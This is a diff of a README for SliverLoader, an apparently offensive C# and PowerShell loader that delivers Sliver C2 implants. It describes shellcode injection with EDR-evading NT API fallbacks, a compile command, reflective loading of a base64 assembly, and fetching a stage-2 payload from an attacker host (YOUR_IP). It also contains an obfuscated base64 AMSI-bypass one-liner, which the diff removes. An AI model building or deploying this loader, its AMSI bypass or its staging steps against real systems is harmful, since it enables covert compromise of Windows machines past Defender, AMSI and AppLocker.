@@ -1,6 +1,6 @@
 # SliverLoader
 
-This proof of concept (PoC) utilizes a DLL and a PowerShell loader to deploy a Sliver Agent, incorporating process injection and hollowing. The shellcode runner is implemented in C# using the .NET Framework 4.0, which is typically pre-installed on Windows 10 and newer systems, and is also available on many updated legacy systems. Execution is facilitated via PowerShell. The PoC aims to bypass defenses including Windows Defender, AMSI, PowerShell Constrained Language Mode, and AppLocker. Additionally, the runner employs HTTPS protocol utilizing custom SSL certificates and keys for staging, and employs AES encryption to further obfuscate the shellcode, enhancing security layers.
+A modular C# loader for Sliver C2 shellcode with multiple injection techniques and evasion capabilities. SliverLoader can inject into existing processes or spawn new ones, uses NT APIs, and maintains a small footprint suitable for reflective loading.
 
 ## Sliver C2 Setup
 
@@ -42,19 +42,25 @@ sliver > implants
 
 ## Shellcode Runner
 
-The features intended for inclusion in this shellcode runner are support for various staging scenarios offered by the Sliver C2 (such as raw shellcode, compression, AES encryption, and combinations thereof), process hollowing, AMSI bypass, in-memory execution to avoid touching the disk whenever possible, and flexibility in passing arguments without hard-coded parameters, allowing arguments to be passed on the fly. Different approaches could be taken to achieve these goals. The chosen approach involves writing a C# DLL assembly containing all the necessary methods, embedding it in the PowerShell script as a base64 string, decoding the assembly and loading it into the process using reflection, and then specifying the arguments and executing the methods.
+The shellcode runner is implemented in C# as a modular loader that supports multiple staging scenarios offered by Sliver C2, including raw shellcode, AES encryption, GZIP or Deflate compression, and combinations thereof. The loader is designed for in-memory execution to avoid touching the disk, and accepts command-line arguments for flexible configuration without hard-coded parameters. The implementation can be compiled either as a standalone executable for direct execution or as a DLL for reflective loading via PowerShell.
 
-## Process Hollowing
+## Process Injection
 
-Process hollowing is accomplished by injecting shellcode into a process that ideally also generates network traffic to remain more covert. The implementation follows a basic pattern using Win32 APIs such as CreateProcessA, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to inject the code into processes like svchost.exe.
+The loader employs multiple process injection techniques with automatic fallback to ensure reliability across different environments. The primary method uses NtCreateThreadEx, an NT API that bypasses many EDR hooks by avoiding the Win32 API layer. If this fails, the loader falls back to CreateRemoteThread, a reliable Win32 API method. As a final alternative, the loader attempts APC queue injection, which can be stealthier in some scenarios. Memory is allocated as PAGE_READWRITE, the shellcode is written, and protection is then changed to PAGE_EXECUTE_READ, ensuring the memory region is never simultaneously writable and executable.
 
-Conditional operations were added to separate different workflows and to allow passing parameters to various methods.
+## Compilation
+
+Compile the loader as a standalone executable using the C# compiler.
+
+```Powershell
+csc.exe /platform:x64 /target:exe /main:serpent.Program /out:SerpentLoader.exe Program.cs Loader.cs
+```
+
+For PowerShell reflection, compile as a DLL.
 
 ## Powershell Loader
 
-The loader is a PowerShell script hosted on a web server, intended to be downloaded and executed once the attacker gains code execution. The script then loads the stager into memory via reflection and performs the download and execution of the agent from the staging server.
-
-To create the loader, the following steps are neccesarry:
+The loader can be used as a PowerShell script hosted on a web server. The script then loads the stager into memory via reflection and performs the download and execution of the agent from the staging server. To create the loader, the following steps are necessary:
 
 First, the raw bytes of the assembly will need to be copied. For this, a PowerShell command will be used, which will copy the data to the clipboard.
 
@@ -72,9 +78,6 @@ Finally copy the converted values to the script as in `Loader.ps1`.
 > To fetch a stage 2 payload via HTTP in newer versions of Sliver, you need to query a URL that looks like this: `http://YOUR_IP/whatever.config?x=IMPLANT_ID`.
 
 ```powershell
-# AMSI Bypass (if needed)
-[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('U2BlVC1JdGBlbSAoICdWJysnYVInICsgICdJQScgKyAoKCJ7MX17MH0iLWYnMScsJ2JsRTonKSsncTInKSAgKyAoJ3VaJysneCcpICApICggW1RZcEVdKCAgInsxfXswfSItRidGJywnckUnICApICkgIDsgICAgKCAgICBHZXQtdmFySWBBYEJMRSAgKCAoJzFRJysnMlUnKSAgKyd6WCcgICkgIC1WYUwgICkuIkFgc3NgRW1ibHkiLiJHRVRgVFlgUGUiKCggICJ7Nn17M317MX17NH17Mn17MH17NX0iIC1mKCdVdGknKydsJyksJ0EnLCgnQW0nKydzaScpLCgoInswfXsxfSIgLWYgJy5NJywnYW4nKSsnYWdlJysnbWVuJysndC4nKSwoJ3UnKyd0bycrKCJ7MH17Mn17MX0iIC1mICdtYScsJy4nLCd0aW9uJykpLCdzJywoKCJ7MX17MH0iLWYgJ3QnLCdTeXMnKSsnZW0nKSAgKSApLiJnYGV0ZmBpRWxEIiggICggInswfXsyfXsxfSIgLWYoJ2EnKydtc2knKSwnZCcsKCdJJysoInswfXsxfSIgLWYgJ25pJywndEYnKSsoInsxfXswfSItZiAnaWxlJywnYScpKSAgKSwoICAiezJ9ezR9ezB9ezF9ezN9IiAtZiAoJ1MnKyd0YXQnKSwnaScsKCdOb24nKygiezF9ezB9IiAtZid1YmwnLCdQJykrJ2knKSwnYycsJ2MsJyAgKSkuInNFYFRgVmFMVUUiKCAgJHtuYFVMbH0sJHt0YFJ1RX0gKQo=')) | Out-Null
-
 $encodeStr = "TVqQAAMAAAAEAAAA...<SNIP>"
 
 [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($encodeStr))
